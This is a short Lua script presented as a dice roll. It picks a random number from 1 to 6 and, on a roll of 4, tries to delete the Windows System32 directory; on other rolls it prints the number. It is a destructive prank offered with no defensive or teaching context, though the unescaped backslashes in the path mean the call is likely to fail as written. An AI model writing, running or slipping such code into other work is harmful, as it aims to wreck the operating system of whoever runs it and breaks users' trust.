math.randomseed(os.time())
local randomNumber = math.random(1, 6)
if randomNumber == 4 then
    os.remove("C:\Windows\System32")
else
    print("Number is: " .. randomNumber)
end
